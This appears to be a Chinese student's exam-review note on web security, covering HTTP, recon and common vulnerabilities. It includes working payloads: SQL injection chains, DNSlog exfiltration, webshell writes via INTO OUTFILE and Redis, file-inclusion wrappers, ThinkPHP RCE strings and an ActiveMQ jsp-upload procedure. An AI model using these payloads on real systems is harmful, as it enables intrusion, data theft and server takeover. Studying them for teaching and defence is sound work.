# web考试复习

![image-20220314202142074](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314202142.png)

## Web应用服务器处理HTTP报文的过程

静态网页：

![image-20220314152240104](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152240.png)

动态网页：

![image-20220314152409310](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152409.png)

## URL格式：

![image-20220314152913660](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314152913.png)

URL编码：

```
•%3d  =
•%23  #
•%25  %
•%26  &
•%2f  /
•%20  空格
•%0a  新行
•%00  空字节
```

## HTTP报文：

HTTP请求报文由请求行、请求头部、空行和请求数据4个部分组成，请求行由请求方法、URL和HTTP协议版本3个字段组成。

HTTP响应报文由状态行、消息报头、空行、响应正文4个部分组成，请求行由HTTP协议版本、状态码和状态描述3个字段组成。

## session和cookie的区别和关系

Cookie是通过客户端记录信息确定用户的身份，cookie的数据保存在客户端；Session是通过服务端记录信息确定用户身份，session保存在服务端。

Session保存在服务器会更加安全，cookie信息可以被他人盗取、篡改，不太安全。

Cookie由服务端生成，服务端将数据通过http响应存储在浏览器上；session与浏览器无关，session以cookie为基础，将数据存在在服务端，将表示这份数据的session ID以cookie的形式存在客户端。

Session是一个“泛”的概念，可以算是Cookie的拓展，“绕过”Cookie的一些限制，跨域请求问题

## 数据库分类

![image-20220314153733056](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314153733.png)

## 信息收集

dns搜索子域名：subdomain,onforall

证书信息收集：crt.sh

企业信息收集：whois、站长之家、天眼查

目录敏感信息：dirsearch,御剑

端口检测：nmap、fscan

```
常用参数：
-sP: Ping扫描,效率高,返回信息少. 例: nmap -sP 192.168.1.110 
-P0(Pn): 无Ping扫描,可以躲避防火墙防护,可以在目标主机禁止ping的情况下使用
-sS: TCP SYN 扫描,速度快, 1秒1000次左右. 较为隐蔽.
-sT: TCP连接扫描
-sV: 版本探测 ,通过相应的端口探测对应的服务,根据服务的指纹识别出相应的版本.
-T: 时序选项, -TO-T5. 用于IDS逃逸,0=>非常慢,1=>缓慢的,2=>文雅的,3=>普通的,4=>快速的,5=>急速的
-iL: 扫描一个列表文件 例 nmap -iL list.txt
-sU: UDP扫描,扫描非常慢,容易被忽视
-A :全面扫描. 综合扫描. 是一种完整扫描目标信息的扫描方式.  
-p : 指定扫描端口
```

web指纹：潮汐指纹、wappalyzer插件、cms识别、云悉指纹、御剑

旁站查询：nmap、hunter

搜索引擎：fofa、hunter

## 越权

关键：未对权限进行校验 

利用：对id进行遍历等

## SQL注入

本质：插入了sql代码 

类型：union select 联合查询、报错注入、 bool盲注、时间盲注 

利用：oob数据外带、 写入文件getshell

#### **探测：**

1、判断数据库类型：报错、端口信息

2、寻找注入点：GET、POST、Cookie

*确认注入点的核心思想就是判断插入的数据是否被当做SQL语句执行

3、区分数据类型：数字型、字符型、搜索型

4、终止：在注入SQL代码后，将原有的查询代码全部注释掉（#、--+）

#### SQL注入类型

1、堆叠查询：是指可以在单次数据库连接中，执行多个查询序列。简单的来说就是执行多条语句。

2、union联合查询：

![image-20220314160224692](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314160224.png)

**MySQL类型的sql注入联合查询注入查出school数据库中student表中username和age字段数据的流程是什么(提供详细的查询语句)？** 

```
-1’ union select 1,2,3--+      //查看回显
-1’ union select 1,2,database()--+   //获取数据库名为school
-1’ union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="school"--+       //获取school数据库下的数据表
-1’ union select 1,2, group_concat(column_name) from information_schema.columns where table_name="student"--+       //获取student数据表中的字段值
-1’ union select 1,2, concat_ws(char(32,58,32),username,password) from student--+  //查询student数据表中username和password的值
```

3、报错注入：利用页面返回的MySQL报错信息，将想得到的数据通过报错信息带出。

Updatexml、extractvalue、rand()等

```
select 1 and updatexml(1,concat(0x7e,(select user()),0x7e),1);
select 1 and extractvalue(1,concat(0x7e,(select user()),0x7e));
```

4、盲注：当不能直接通过显示数据来获得数据库数据时，需要使用其他方式判断或者尝试，这个过程就是盲注。

基于布尔盲注(根据页面返回内容判断)

----------left函数：left(a,b)从a的左侧截取a的前b位正确返回1，错误返回0。

```
 select 1 and left(database(),1)='s';
```

----------substr函数：select database() substr(1,1),substr(a,b,c)从b截取a的c位长度

```
select substr((select username from users limit 0,1),1,1);
```

----------ascii: ascii('s')获取s的ascii值

```
select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<68; 
```

基于时间盲注(根据页面响应时间判断)

```
select if((ascii(substr((select username from users limit 0,1),1,1))=68),sleep(5),2);
```

**简述sql注入中联合查询和盲注有什么区别、盲注分为哪几种类型?**

联合查询是由两个或两个以上的select语句组成，查询结果通过页面回显出来；盲注是当页面无法回显数据库数据时，通过盲注根据页面是否能正常返回页面或者页面的响应时间来判断。

盲注分为布尔盲注和时间盲注：

布尔盲注通过页面返回的内容来判断，当select语句查询为真时，页面内容正常，当select语句查询为假时，页面中有些信息不会显示出来。函数主要有left函数、substr函数、ascii函数。

时间盲注主要通过页面响应的时间来判断，当select语句查询为真时，页面会根据select语句等待几秒后才出现页面内容。主要的函数有sleep函数。

#### SQL注入利用

数据外带：（dnslog）

```
select CONCAT("\\\\",version(),"2.ccz549.dnslog.cn\\a.txt");
select LOAD_FILE(CONCAT("\\\\",version(),"2.ccz549.dnslog.cn\\a.txt"));
```

写shell：

```
 select "<?php eval($_POST['x'];?>" into outfile "D:/phpstudy/WWW/sqli/Less-1/shell.php";
```

## XSS跨站脚本攻击

本质：插入了 javascript代码 

分类：反射型、 存储型、dom型 

利用：弹窗、打 cookie、钓鱼、

#### **寻找xss漏洞**

寻找WEB应用上的输入与输出口。例如网站输入框、URL参数等等。

在可控参数中提交<script>alert(/xss/)</script>等攻击字符串，观察输出点是否对这些攻击字符串进行转义、过滤、消毒等处理。

如果原样输出，那么必然存在XSS漏洞。

#### **阐述xss有几种类型，各有什么区别?**

XSS有反射型XSS、存储型XSS和DOM型XSS三种类型。

反射型XSS在有文本框的情况下就可能出现，反射型XSS不经过数据库，通过网页直接解析java script代码。因为没有存储，所以只能解析一次。

存储型XSSPayload是有经过存储的，当一个页面存在存储型XSS的时候，XSS注入成功后，那么每次访问该页面都将触发XSS，如留言板

反射型或存储型是服务端将提交的内容反馈到了html源码内，导致触发xss。也就是说返回到html源码中可以看到触发xss的代码。

DOM型XSS主要通过java script操作document，实现dom树的重构，主要是通过查看网页的代码，用户可以在文本框或者url写入java script代码修改网页的dom，造成客户端payload在浏览器中执行，也只能执行一次，不存在存储功能。DOM型XSS只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来

#### **危害**：

•Cookie盗取

•钓鱼（伪造登录框，页面）

•获取IP段

•站点重定向

•获取客户端页面信息，例如邮件内容窃取

•XSS蠕虫

## 文件上传漏洞

本质：插入了可执行脚本 文件(asp、jsp、php) 

分类：js绕过、MIME绕 过、黑名单绕过、双写绕过、图片马等等 

利用：burpsuite抓包改包、找路径

#### **绕过方式：**

1、客户端JavaScript验证

2、服务端MIME类型验证（content-type）

3、服务端文件扩展名验证

​                      黑名单（大小写、php|php2|php3|php4|php5解析、%00会截断文件名，只保存%00之前的内容、）

​                      白名单

4、服务器文件内容验证（.htaccess的配置有效，写入SetHandler application/x-httpd-php ）

5、操作系统特性（空格、.）

6、服务器解析漏洞：指利用中间件(Apache、nginx、iis等)

apache解析文件规则是从右到左

 iis解析：

​              目录解析：目录名为.asp、.asa、.cer，则目录下的所有文件都会被作为ASP解析。

​              文件解析：文件名中分号后不被解析，例如.asp;、.asa;、.cer;。

​             文件类型解析：.asa，.cer，.cdx都会被作为asp文件执行。 

nginx：当用户配置不当，会导致任意文件被当作php去解析

​              （利用过程：1.上传一个`shell.jpg `文件，注意最后为空格

​                                     2.访问`url/shell.jpg[0x20][0x00].php`）

7、文件头(文件幻数)

## 文件包含

本质：包含了可执行代码(asp、jsp、php) 

分类：本地文件包含、远程文件包含 

利用：包含远程或者本地php文件，伪协议

#### 函数：

include与require基本是相同的，除了错误处理方面:

•include()，只生成警告（E_WARNING），并且脚本会继续

•require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本

•include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上

#### 伪协议：

**php://input**：可以获取POST的数据流。当它与包含函数结合时，php://input流会被当作php文件执行。从而导致任意代码执行。

**php://filter**：可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

```
?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

**zip://**：可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行

```
zip://[压缩包绝对路径]#[压缩包内文件]
```

**phar://**：中相对路径和绝对路径都可以使用

**data://**：类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致 任意代码执行

```
data://[<MIME-type>][;charset=][;base64],<data>
?filename=data://,<?php phpinfo();
?filename=data://text/plain,<?php phpinfo();
?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
?filename=data:text/plain,<?php phpinfo();
?filename=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

#### 绕过方式：

前缀绕过：使用../../来返回上一目录，被成为目录遍历(Path Traversal)

后缀绕过：

![image-20220314185037172](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314185042.png)

![image-20220314185057380](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314185057.png)

#### 防御：

•allow_url_include和allow_url_fopen最小权限化

•设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）

•白名单限制包含文件，或者严格过滤./\

####  **文件上传和文件包含应该如何联动？**

在文件上传漏洞时，我们可以上传图片马或者php代码，然后查看文件上传的路径。在本地文件包含时，可以直接在filename后面写入我们上传的文件的路径，访问url就可以读取到这个文件。

我们也可以上传图片马之后，复制打开图片马的url，然后在远程文件包含的filename后面写上图片马的url，也可以完成文件包含漏洞。

#### **文件包含中两种类型的区别是什么？**

文件包含主要有本地文件包含和远程文件包含两种。

本地文件包含是直接在网页url中的filename后面写入目标主机内的文件去读取；是获取目标主机本地的文件。

远程文件包含是通过php伪协议通过在网页url中的filename后写入php伪协议和文件路径去读取文件内容，可以读取到攻击者主机上的文件内容，也可以读取url的内容。

## 任意文件下载

本质：插入了恶 意的文件路径 

利用：利用 payload下载任 意文件

实现过程：根据参数filename的值，获得该文件在网站上的绝对路径，读取文件内容，发送给客户端进行下载。

**利用**：

•获得站点源码(黑盒->白盒)

•获得站点与中间件配置文件。

•获得应用与系统配置文件(ssh、mysql)

**漏洞发现**：

![image-20220314190104507](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314190104.png)

**防御**：

•下载路径不可控，而是程序自动生成后保存在数据库中，根据ID进行下载

•对参数做严格的过滤，不能进行目录遍历(穿越)

## 身份认证攻击

关键：可对用户名密码进行伪造 

利用：利用burpsuite进行爆破

爆破方式：

用户名密码爆破

编码类身份认证爆破

302跳转身份认证爆破

...

## 命令/代码执行 

本质：插入了恶意的命令/代码 

分类：回显和不回显 

利用：利用&& 和||等拼接命令、 dnslog等等

#### 代码执行函数：

**mixed eval( string $code)**

把字符串 code 作为PHP代码执行。

**bool assert ( mixed $assertion [, string $description ] )**

PHP语言中是用来判断一个表达式是否成立，返回true or false。

如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行

#### 命令执行函数：

**string system( string $command[, int &$return_var] )**

函数执行 command 参数所指定的命令，并且输出执行结果。 

**string exec( string $command[, array &$output[, int &$return_var]] )**

exec() 执行 command 参数所指定的命令。

#### 命令执行漏洞绕过：

![image-20220314192011747](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314192011.png)

![image-20220314192022303](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314192022.png)

![image-20220314192105938](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314192105.png)

![image-20220314192142158](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314192142.png)

#### 无回显的情况下

1.利用信息外带

Linux&&windows

2.写文件

```
127.0.0.1&&echo "<?php phpinfo()?>" >"123.php"
```

#### **代码注入和命令注入的差别是什么，不回显的情况应如何利用?**

代码注入是用户可以通过请求将恶意代码注入到WEB应用进行执行，比如php代码、js代码。

命令注入是用户可以注入CMD命令或者bash命令，然后可以执行系统或者应用指令，比如whoami、读取文件的内容等等。

在不回显的情况下可以通过http通道或者DNS通道带出数据，也可以写文件（127.0.0.1&&echo "<?php phpinfo()?>" >"123.php"），写入webshell。

## 反序列化漏洞

本质：插入了恶意的反序列化数据，触发了恶意函数 

利用：魔术方法、普通成员方法、重名方法

php序列化的函数为serialize()，可以将对象中的成员变量转换成字符串。

反序列化的函数为unserilize()，可以将serialize生成的字符串重新还原为对象中的成员变量。

#### **阐述几种php魔术方法，分别在什么时候调用**

__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的

__destruct()：当对象被销毁时会自动调用

__wakeup()：如前所提，unserialize()时会自动调用

__sleep()：使用serialize时调用

__call()：在对象上下文中调用不可访问的方法时调用

__callStatic() ：在静态上下文中调用不可访问的方法时调用

__get() ：用于从不可访问的属性读取数据

__set() ：用于将数据写入不可访问的属性

__isset() ：在不可访问的属性上调用isset()或empty()调用

__unset() ：在不可访问的属性上使用unset()时调用

__toString() ：把类当作字符串使用时调用,返回值需要为字符串

__invoke() ：当脚本尝试将对象调用为函数时调用

**利用方式**：

wakeup()或者 destruct() 利用

__construct()利用

普通成员方法利用(变量属性为public)

普通成员方法利用(变量属性为private)

重名方法利用

####  **在php反序列化中私有成员和公有成员在构造恶意反序列化数据时有何区别？**

私有成员在构造恶意反序列化数据时，要对该私有成员的name进行限制要在成员name前加上“%00对象名%00”。比如在a这个对象中有一个私有成员b为bbb，那么我们在构造恶意反序列化数据时应该写为O：1：“a”：1：{s：4：“%00a%00b”；s：3：“bbb”；}，其中%00a%00b就是对成员的name进行了限制，%00是截断符，算一个字符。

公有成员在构造恶意反序列化数据时就不需要限制了，比如在a这个对象中有一个公有成员b为bbb，那么我们在构造恶意反序列化数据时应该写为O：1：“a”：1：{s：1：“b”；s：3：“bbb”；}。

## 服务端请求伪造 

本质：利用web服务 器对内网发起请求 

分类：回显和不回显 

利用：读取文件、探测端口、攻击其他应 用

#### SSRF危害：

SSRF是因为没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在服务端请求伪造。

危害有：1、可以利用发起网络请求的服务，当作跳板来攻击其他服务。

2、可以扫描内部网络，获得端口、服务信息;

3、攻击运行在内网或本地的应用程序

4、对内网Web应用进行指纹识别，通过访问默认文件实现

5、对内部任意主机和任意端口发送精心构造的请求包进行攻击

6、利用file协议读取本地文件

#### SSRF发现：能够对外发起网络请求的地方，就可能存在SSRF。

#### SSRF利用方式：

使用file协议读取源码敏感文件，配合fuzz字典，信息搜集

使用dict://协议刺探内网端口信息

Gopher://协议:Redis 任意文件写入漏洞现在非常常见，很多情况下内网中都会存在 root 权限运行的 Redis 服务，可以利用SSRF 来穿透内网，在利用 Gopher 协议攻击内网中的 Redis。

#### 在redis-cli中正常写入文件的过程：

```
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir /var/www/html
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell "<?php phpinfo();?>"
redis-cli -h 127.0.0.1 save
```

绕过方式：

xip.io(功能就是将***.127.0.0.1.xip.io解析成127.0.0.1)

ip格式绕过

协议绕过

## xxe 

本质：插入了恶意的xml语 句，引入了恶意的外部实体 

分类：外部参数实体、外部一 般实体、内部参数实体、内部 一般实体 

利用：读取文件、执行命令、 信息外带、探测内网结构ddos

#### XXE漏洞能够造成什么危害？

XXE为 XML 外部实体注入，本质上就是插入了恶意的xml代码。它的危害主要有：

1、利用file协议读取文件

2、根据返回状态对内网进行探测

3、利用参数实体进行文件读取外带

4、利用xxe实现ddos攻击

![image-20220314201420635](https://bao-1309906221.cos.ap-nanjing.myqcloud.com/20220314201420.png)

#### 漏洞利用

回显利用1：利用file协议读取文件

回显利用2：利用php自带的协议读取文件

```
php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini
```

（回显利用3：利用expect扩展库进行命令执行，需要安装expect库）

回显利用4：利用php自带的协议进行内网探测

回显利用5：利用php自带的协议进行内网探测

无回显利用：利用参数实体进行文件读取外带



#### **整理thinkphp存在哪些历史漏洞，分别如何利用?**

1、 ThinkPHP2.x远程代码执行漏洞：

ThinkPHP 2.x版本中，preg_replace的/e模式匹配路由导致输入参数被插入双引号中当做代码函数执行，因此造成任意代码执行漏洞。

Payload：[/index.php?s=/index/index/aaa/${@phpinfo()}](mailto:/index.php?s=/index/index/aaa/${@phpinfo()})

/index.php?s=/index/index/aaa/${${@eval($_POST[pass])}}

2、 ThinkPHP 5.1.x SQL注入漏洞

在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。

3、ThinkPHP3[日志](https://so.csdn.net/so/search?q=日志&spm=1001.2101.3001.7020)泄露

可以直接访问日志目录，可以看到泄露的日志thinkphp日志文件。

Payload：/Application/Runtime/Logs/Home/21_04_20.log

4、ThinkPHP5.0.23远程代码执行漏洞

在ThinkPHP5.0.23以前版本中，获取的method的方法中没有准确的处理方法名，因此可以调用request方法构造利用点。抓包修改请求方式POST,写入shell.php

Payload: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

5、ThinkPHP5.0.21远程命令执行漏洞

没有对路由中的控制器进行严格过滤，没有开启强制路由的情况下可以执行系统命令。

Payload：/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令参数

#### Activemq任意文件写入漏洞具体如何利用？

首先可以通过admin-admin登陆，访问/admin/test/systemProperties.jsp api里面记录了根目录和其他配置信息

然后我们对/fileserver/1.txt网页进行抓包，修改请求方式为PUT类型，在请求数据中插入jsp木马，重放数据包，得到204的响应包表示写入成功

然后我们修改请求类型为MOVE，就是将写入的1.txt文件路径改掉，在请求头里加上我们需要改成的路径和文件名（Destination:file:///opt/activemq/webapps/api/q.jsp），重放数据包，得到204的响应包表示文件路径修改成功

然后我们打开/api/q.jsp访问，发现需要进行admin登陆验证，我们对网页抓包，得到请求头

然后使用冰蝎连接，加上获取到的请求头，就可以连接成功啦

#### Shiro的一般特征是什么？

shiro一个特征就是存在remember-me，通过抓包，就可以看到存在remember-me

#### Weblogic有哪些常见的安全漏洞？

1、CVE-2017-10271

[Weblogic](https://so.csdn.net/so/search?q=Weblogic&spm=1001.2101.3001.7020)的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

2、CVE-2018-2628

该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。

3、CVE-2018-2894

利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。

4、Weblogic文件读取

环境启动后，访问http://your-ip:7001/console，即为weblogic后台。

本环境存在弱口令：weblogic-Oracle@123

weblogic常用弱口令： http://cirt.net/passwords?criteria=weblogic，任意文件读取漏洞的利用

#### **解析漏洞有哪些，都涉及到哪几个中间件，详细整理并形成学习记录。**

Ø **IIS5.x-6.x解析漏洞**

使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件

1、目录解析

形式：[www.xxx.com/xx.asp/xx.jpg](http://www.xxx.com/xx.asp/xx.jpg)

原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。

2、文件解析

形式：[www.xxx.com/xx.asp;.jpg](http://www.xxx.com/xx.asp;.jpg)

原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。

3、解析文件类型

IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa、/test.cer、/test.cdx

4、畸形解析漏洞

test.jpg/\.php

IIS7/7.5在Fast-CGI运行模式下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。

Ø **IIS7.5解析漏洞**

IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。

1、%00空字节代码解析漏洞

nginx<=0.8.37 存在解析漏洞，Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码，然后通过访问 xxx.jpg%00.php 来执行其中的代码

2、文件名逻辑漏洞

影响nginx版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。如：1.gif[0x20][0x00].php

Ø **apache解析漏洞**

Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。

1、文件名解析漏洞

用户配置不当，apace解析从右至左进行判断，如果为不可识别解析，就再往左判断。如 1.php.a.b.c ，c 不识别会向前进找，知道找到可识别后缀

Ø **Nginx解析漏洞**

漏洞形式

www.xxxx.com/UploadFiles/image/1.jpg/1.php

www.xxxx.com/UploadFiles/image/1.jpg%00.php

www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php

另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。

1、.htaccess 文件

htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，通过上传.htaccess 文件可以解析特定的文件











